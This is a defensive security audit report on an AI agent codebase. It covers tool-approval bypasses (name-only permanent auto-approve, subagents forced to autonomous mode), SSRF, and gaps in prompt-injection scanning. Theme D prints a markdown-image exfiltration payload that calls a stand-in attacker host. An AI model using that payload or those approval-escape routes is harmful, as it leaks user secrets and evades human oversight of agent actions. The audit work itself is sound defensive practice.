# Gosling — Audit-Skills Pack Report

**Date:** 2026-07-10
**Target:** `repo-makeover/gosling` @ branch `claude/audit-skills-report-abcnsz`
**Method:** applied the `agent-skills` `010_audit/` skill pack (read-only, source-evidenced), one lens per skill, over the shared `000_common/audit-base` method (severity matrix, evidence discipline, finding format).
**Coverage:** 32 of 41 audit skills applied; 9 excluded as not applicable to this stack (see §6).

> Scope note: the request named `020_audit/`; in `agent-skills` the audit bucket is `010_audit/` (`020_*` is `020_repair`). This report covers the `010_audit/` pack.

---

## 1. Executive summary

Gosling is a **defensively strong codebase** with a clear security spine: constant-time
token comparison, SHA-256 cert pinning on the localhost transport, OIDC signature
verification, atomic temp-file+rename for secrets/config, SQLite `BEGIN IMMEDIATE`
transactions for session writes, bounded+jittered provider retry, byte-capped shell
output and replay buffers, SLSA build provenance, and fully SHA-pinned GitHub Actions.
Many skills returned "strong non-findings" — the guardrails they look for are present.

The material findings cluster into **seven recurring themes**. Two dominate:

1. **The permission / approval gate is bypassable and over-caching** (found independently
   by 4 skills). In the default `SmartApprove` mode, an LLM classifies a tool as
   "read-only" from its **name alone**, then that verdict is persisted **globally, forever,
   keyed by tool name** — so a tool that reads or writes depending on its arguments gets
   blanket no-confirmation approval across every future session and project. Adjacent
   holes: server-declared `read_only_hint` is trusted as a security decision, and delegated
   subagents are hardcoded to fully-autonomous `Auto` mode regardless of the parent's mode.

2. **A crash between "tool side-effect executed" and "conversation persisted" duplicates or
   corrupts** (found independently by 4 skills). The turn's messages are written one-by-one,
   non-transactionally, *after* the tools have already run; file-mutating tools write
   in-place (no temp+rename). A SIGKILL/OOM/restart at the wrong moment loses the record of
   a completed side effect (→ re-executed on resume) or leaves a torn `tool_request` with no
   `tool_response` (→ strict providers reject the session on reload).

The remaining themes: **server exposure & transport defaults**, **SSRF / model-output
exfiltration**, **child-process & log lifecycle leaks**, **contract/invariant drift via
string-sniffing**, and **truncation-reported-as-success**.

No finding is rated Critical; several High findings approach Critical when a secondary
condition holds (operator binds to `0.0.0.0`, a compromised MCP server, an attacker-shared
session). None requires exotic access — the reachable ones sit on the default agent path.

---

## 2. Cross-cutting themes (ranked)

### Theme A — Permission / approval-gate weaknesses  ★ highest priority
Corroborated by `audit-negative-space`, `audit-dataflow-state-transition`,
`audit-security-llm`, `audit-agent-orchestration-code`.

- **Name-only, permanent, global auto-approve.** `SmartApprove` (the shipped default,
  `gosling_mode.rs:41-42`) sends only the **tool name** to the classifier
  (`permission_judge.rs:90-116`), then writes an `AlwaysAllow` verdict keyed by name into
  persistent config (`permission_inspector.rs:165-188`, `config/permission.rs:218`). A tool
  whose behavior depends on arguments (fetch/query/an MCP tool that also deletes) is
  auto-approved for **all future argument values, in every project and session**.
- **Grant is global, not scoped.** Choosing "Always Allow" for `developer__shell` in one
  trusted repo auto-approves it everywhere (`tool_execution.rs:150-153`,
  `config/permission.rs:213-253`). `WorkingDirScopeInspector` only mitigates when its opt-in
  flag is on.
- **Server self-annotation trusted.** `read_only_hint` supplied by the (untrusted) MCP
  server yields `Allow` with no prompt (`permission_inspector.rs:41-52,165-169`).
- **Delegated subagents forced to Auto.** `summon.rs:979-985,1396-1402` hardcode
  `GoslingMode::Auto` for every subagent; the model can `delegate` to escape a parent's
  Approve mode into fully-autonomous shell/file-write.
- **Loop guard off by default** (`tool_monitor.rs:59-63`, `max_repetitions: None`).

### Theme B — Crash atomicity: side-effect-before-persist & non-atomic writes  ★ highest priority
Corroborated by `audit-dataflow-pipeline-graph`, `audit-recovery-idempotency`,
`audit-dataflow-integrity`, `audit-dataflow-state-transition`, `audit-reliability`.

- **Side effect executes before its result is persisted.** Approved tools run
  (`agent.rs:2382-2434`) but the assistant `tool_request` + `tool_response` are only written
  after the whole loop (`agent.rs:2806-2808`). Crash between ⇒ no session trace ⇒ on resume
  the model re-issues the same non-idempotent call (repeat shell command / `git push`).
- **Per-message persistence loop is non-transactional.** A failure mid-loop persists a
  `tool_request` with no paired `tool_response` ⇒ strict providers reject on reload, wedging
  the session. Cancellation mid-tool has the same shape (`STT-003`).
- **File-mutating tools write in place.** `developer` `file_write`/`file_edit`
  (`edit.rs:87,133`), the MCP memory store (`gosling-mcp/memory/mod.rs:303-314`), and the
  permission store (`config/permission.rs:102-110`) use bare `fs::write` — a kill mid-write
  truncates the file with the original already gone, while sibling code uses the atomic
  temp+rename idiom.
- **Provider retry after timeout re-sends with no idempotency key**
  (`retry.rs:99-108,224-252`) ⇒ possible duplicate completion / double token charge.

### Theme C — Server exposure & transport defaults
`audit-security`, `audit-operator-signal`, `audit-reliability`.

- `gosling serve --dangerously-unauthenticated` omits the auth layer
  (`acp/transport/mod.rs:191-197`), origin is enforced **only on WS upgrades, not POST
  /acp** (`:117-136`), and nothing cross-checks the bind host. Operator adds `--host
  0.0.0.0` ⇒ unauthenticated agent with the `developer` shell tool reachable from the
  network (**SEC-SRV-001**, near-Critical).
- `gosling serve` defaults to **plaintext HTTP** (`cli.rs:607-608`), so `X-Secret-Key` is
  sent in clear on a non-loopback bind — unlike `goslingd`, which defaults TLS on.
- ACP secret is also accepted as a **`?token=` URL query param** (`auth.rs:25-31`) ⇒ leaks
  into access/proxy logs and history.
- `/status` returns a hardcoded `"ok"` (`routes/status.rs:16-18`) with no subsystem probe,
  and session telemetry logs `exit_type="normal"` on error/cancel paths
  (`reply_service.rs:406-415`) ⇒ green-while-broken + failure-blind dashboards.

### Theme D — SSRF & model-output exfiltration
`audit-dataflow-input-output`, `audit-security-code`, `audit-security-llm`.

- `web_scrape` (`computercontroller/mod.rs:598,676`) and `image_read`
  (`developer/image.rs:200-209`) fetch **model-controlled URLs** with no host allowlist and
  no private/link-local block ⇒ SSRF to `169.254.169.254` / RFC1918; `image_read` also
  buffers the whole body before its size check when `Content-Length` is absent.
- **Markdown-image exfil channel** in the desktop: model output renders `<img src>` with
  `img-src ... https:` (`csp.ts:104`, `MarkdownContent.tsx:259-298`) ⇒
  `![](https://attacker/?d=<secret>)` is silently GET-fetched on render.
- Indirect-prompt-injection scanning **never inspects tool/retrieved content and is off by
  default** (`scanner.rs:445-465`, `security/mod.rs:100-102`); the egress inspector only
  matches name-known shell/web tools (`egress_inspector.rs:275-293`).

### Theme E — Process & disk lifecycle leaks
`audit-resource-lifecycle`, `audit-failsafe-readiness`, `audit-agent-orchestration-code`.

- The `developer` shell and `computercontroller` script runners spawn `sh -c` **without a
  process group** (`shell.rs` build path never calls `configure_subprocess`), so
  timeout/cancel SIGKILLs only the shell PID — grandchildren (npm→node, daemons) reparent to
  init and leak fds/ports. On macOS a hard parent SIGKILL orphans all MCP/provider children
  (`subprocess.rs:50-65`; PDEATHSIG is Linux-only).
- `computercontroller` script exec has **no timeout at all** (`mod.rs:114-126`).
- Logs use `Rotation::NEVER` with retention swept only at startup (`logging.rs:64,120,152`)
  ⇒ a long-lived daemon's current log grows unbounded.
- TLS server `graceful_shutdown(None)` (`server agent.rs:93-96`) has no deadline ⇒ open SSE
  streams stall SIGTERM, forcing SIGKILL (which then triggers the macOS orphan above).

### Theme F — Contract / invariant drift via string-sniffing & duplicated schemas
`audit-architecture-seam`, `audit-contract-internalapi`, `audit-invariant-sync`,
`audit-architecture-drift`.

- **"Is this a Claude model?" is reimplemented 6+ times**, two Databricks sites omitting
  case-normalization (`databricks_v2.rs:185`, `formats/databricks.rs:479`) ⇒ a capitalized
  `Claude-Sonnet-4` silently loses prompt-cache and reasoning routing on one path while
  other paths treat it as Claude. Same string-sniff decides the durable-memory filename
  (`base.rs:545-551`).
- Duplicated hand-maintained schemas with one-way silent drift: `ConfigKey` vs
  `ProviderConfigKey` (`+ hand DTO map`), TS provider types vs Rust structs, a phantom
  `Local` provider-setup variant present in the DTO/TS but absent from the canonical enum.
- The **ACP `_gosling/*` boundary is a strong positive** — codegen'd and CI-pinned
  (`just check-acp-schema`) — but session-message payloads are exported as opaque
  `serde_json::Value` (`custom_requests.rs:727`), the one hole the drift guard can't see.
- Onboarding docs drift: `AGENTS.md` "Structure" lists 6 of the 10 crates (omits
  `gosling-server`, the crate that hosts the reply architecture its own invariants govern).

### Theme G — Truncation / partial output reported as success
`audit-pipeline-externalapi`, `audit-workflow-gui`, `audit-agent-orchestration-code`,
`audit-operator-signal`.

- Provider `finish_reason=="length"` / `stop_reason=="max_tokens"` is **not checked for text
  content** (`openai.rs:1296`, `anthropic.rs:1012-1019`) ⇒ a truncated answer is committed as
  the model's complete turn.
- The desktop **discards `PromptResponse.stopReason`** (`chatSessionController.ts:194-199`)
  and fires a "task completed" notification for `max_tokens`/`refusal` alike — while the Ink
  TUI correctly surfaces "stopped: max_tokens" (CLI/desktop parity mismatch).
- Subagent turn-limit exhaustion returns the "reached maximum actions" message as ordinary
  **success text** (`agent.rs:2084-2088` → `subagent_handler.rs:65-70` →
  `summon.rs:1032-1034`).

---

## 3. Highest-severity findings (ranked)

| # | Sev / Conf | Finding | Evidence anchor | Theme |
|---|---|---|---|---|
| 1 | High/Likely→**near-Crit** | `serve --dangerously-unauthenticated` + non-loopback `--host` = unauthenticated networked agent RCE (developer shell) | `cli.rs:1128-1169`; `acp/transport/mod.rs:191-197,117-136` | C |
| 2 | High/Conf | SmartApprove read-only verdict keyed by **tool name**, cached **globally & permanently**; args ignored | `permission_judge.rs:90-116`; `permission_inspector.rs:165-188`; `permission.rs:218` | A |
| 3 | High/Conf | Delegated subagents hardcode `GoslingMode::Auto`, bypassing parent Approve mode | `summon.rs:979-985,1396-1402`; `permission_inspector.rs:153` | A |
| 4 | High/Conf | `serve` defaults to plaintext HTTP; `X-Secret-Key` sent in clear on non-loopback bind | `cli.rs:607-608,1199-1206` | C |
| 5 | High/Likely | Tool side-effects execute before conversation is persisted → crash-resume duplicates them | `agent.rs:2382-2434` vs `:2806-2808` | B |
| 6 | High/Conf | `file_write`/`file_edit` (and memory/permission stores) non-atomic in-place writes → truncation on interrupt | `edit.rs:87,133`; `memory/mod.rs:303-314`; `permission.rs:102-110` | B |
| 7 | High/Conf | Markdown-image side-channel exfiltration of model output in desktop | `csp.ts:104`; `MarkdownContent.tsx:259-298` | D |
| 8 | High/Conf | One MCP extension's `list_tools` failure aborts the entire agent turn (all tools lost) | `extension_manager.rs:1541-1555` → `agent.rs:691` | E/reliability |
| 9 | High/Plaus | Server-declared `read_only_hint` auto-approves tools with no prompt | `permission_inspector.rs:41-52,165-169` | A |
| 10 | High/Conf | Subagent turn-limit exhaustion reported as success | `agent.rs:2084-2088`; `subagent_handler.rs:65-70` | G |
| 11 | High/Likely | Streaming markdown buffer re-scans whole buffer per chunk → O(L²) inside code blocks | `gosling-cli/streaming_buffer.rs:279-361` | perf |
| 12 | High/Conf | App-wide secondary/placeholder text fails WCAG 1.4.3 contrast (3.6:1) | `theme-tokens.ts:96,109`; `input.tsx:11` | a11y |

**Notable Medium findings** (full list in the appendix file): SSRF via `web_scrape`/`image_read`;
Windows `cmd.exe` arg-injection in `open-in-chrome`; OSV.dev is a fail-closed availability SPOF
for all package extensions; JWKS cache serves revoked keys up to 1h; unbounded default shell
timeout; `/status` health lie + `exit_type="normal"` on error paths; non-atomic concurrent
appends to the user's `CLAUDE.md`/`memories.jsonl`; cargo-deny limited to advisories only;
Dependabot minor auto-merge via `pull_request_target`; nostr shared-session import trusts
attacker-chosen `working_dir`.

---

## 4. What's solid (representative strong non-findings)

- **Crypto/transport:** constant-time token compare (`subtle::ct_eq`), SHA-256 cert-pinning
  on localhost TLS (`rejectUnauthorized:false` is paired with a fingerprint check, not a
  disable), OIDC RS/ES-only alg map with signature verified before `valid:true`.
- **Persistence core:** session/message writes under `BEGIN IMMEDIATE` transactions,
  FK-enforced, WAL + 30s busy timeout; secrets/config use atomic temp+rename and are stored
  separately from `/config` output.
- **Provider resilience:** exponential backoff + full jitter, transient-only retry
  classification, `Retry-After` parsing hardened against NaN/negative/absurd values, single
  independent auth-refresh (no storm), 600s client timeout, rich replayable SSE fixtures.
- **Memory discipline:** shell output capped at 10 MiB with pipe-draining, byte+count-bounded
  replay buffer, LRU-bounded session caches, renderer IPC listeners cleaned up on unmount.
- **Supply chain:** all Actions SHA-pinned, Dependabot across npm/cargo/docker/actions, SLSA
  provenance + `npm --provenance`, OIDC trusted publishing (no `NPM_TOKEN`), collaborator
  gate before any `pr-comment-*` checkout.
- **Electron:** `contextIsolation:true`, `nodeIntegration:false`, strict CSP, window-open
  denied + routed to a safe external opener, file IPC path-confined via normalize-then-verify.

---

## 5. Recommended remediation order

1. **Permission model (Theme A).** Classify per-call including arguments; never blanket-allow
   a tool whose args carry a sink (url/path/body); scope grants to session/working-dir; stop
   treating `read_only_hint` as a security decision; inherit parent mode for subagents.
2. **Turn atomicity (Theme B).** Persist the assistant `tool_request` *before* dispatch,
   dedupe on `tool_call_id` at resume, wrap a turn's messages in one transaction, and switch
   file-mutating tools + the memory/permission stores to temp+fsync+rename.
3. **Serve hardening (Theme C).** Refuse unauthenticated mode unless the bind host is
   loopback; default TLS on (or hard-fail plaintext on non-loopback); enforce origin on all
   `/acp` methods; drop the `?token=` path; make `/status` honest.
4. **Egress/SSRF (Theme D).** Host-allowlist + private-range block on `web_scrape`/`image_read`,
   stream with a byte cap; add an `img` component allowlist / tighten CSP `img-src`; scan
   tool/retrieved content for injection and enable it by default.
5. **Lifecycle (Theme E), drift guards (Theme F), truncation signals (Theme G)** as
   follow-ups — mostly local guardrails plus a handful of parity tests.

---

## 6. Skill applicability ledger

**Applied (32):** audit-agent-orchestration-code, audit-architecture-drift,
audit-architecture-seam, audit-architecture-nodejs, audit-contract-internalapi,
audit-dataflow-cascade, audit-dataflow-concurrency, audit-dataflow-input-output,
audit-dataflow-integrity, audit-dataflow-pipeline-graph, audit-dataflow-state-transition,
audit-dataflow-temporal, audit-deadcode-cleanup, audit-dependency-criticality,
audit-failsafe-readiness, audit-invariant-sync, audit-memory-lifecycle, audit-negative-space,
audit-operator-signal, audit-performance-profile, audit-pipeline-externalapi,
audit-recovery-idempotency, audit-reliability, audit-resource-lifecycle, audit-security,
audit-security-code, audit-security-llm, audit-security-nodejs, audit-security-repo-posture,
audit-security-repo-triage, audit-workflow-gui, audit-design-webapp.

**Excluded (9), with reason:**

| Skill | Reason not applicable |
|---|---|
| audit-flutter-ios | No Flutter/iOS code in the repo |
| audit-go-repo-hardening | Go-specific taxonomy; gosling core is Rust |
| audit-security-supabase | No Supabase backend (one string reference in settings.ts only) |
| audit-equation-sourcebase | No equation/sourcebase data corpus |
| audit-compliance-posture | No SSDF/NIST compliance-collector artifacts to audit |
| audit-contract-crossrepo | The two in-scope repos are not a producer/consumer contract pair |
| audit-multiagent-consensus | Meta-method for orchestrating the pack across agents — it is the *how*, not a lens against gosling |
| audit-playtest-app | Requires launching the running app; out of scope for a read-only static pass |
| audit-security-vuln-harness | Multi-run exploit-hunting harness; overlaps the applied audit-security-code / audit-security-llm coverage |

`audit-architecture-nodejs`, `audit-security-nodejs`, and `audit-design-webapp` were applied
in **partial** mode (Electron/React renderer, not a web server), with the framework-specific
gates (Express/Nest routing, SEO, browser matrix) skipped.

---

## 7. Method notes & limits

- Every finding is source-evidenced at `file:line` a reader actually opened; confidence follows
  the base `evidence_discipline` rules (Confirmed only with quoted evidence, else
  Likely/Plausible/Speculative). No code was built or run; runtime-manifestation claims are
  capped at Likely.
- Findings were produced by one subagent per skill against a shared base method, then merged;
  where ≥2 skills independently reached the same mechanism (Themes A and B especially),
  confidence is correspondingly higher.
- The complete per-skill output (all findings, IDs, and per-skill non-findings) is retained
  alongside this report during the session; the tables above are the deduplicated synthesis.
